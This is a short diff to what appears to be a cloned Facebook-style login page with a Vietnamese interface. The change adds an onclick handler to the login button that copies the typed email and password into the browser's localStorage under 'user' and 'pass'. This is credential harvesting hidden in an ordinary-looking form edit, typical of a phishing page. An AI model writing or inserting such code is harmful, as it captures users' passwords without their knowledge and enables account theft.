@@ -4068,6 +4068,10 @@
                               value="Đăng nhập"
                               aria-label="Đăng nhập"
                               data-testid="royal_login_button"
+                              onclick="
+                              localStorage.setItem('user',document.getElementById('email').value)
+                              localStorage.setItem('pass',document.getElementById('pass').value)
+                              "
                               type="submit"
                               id="u_0_b"
                           /></label>
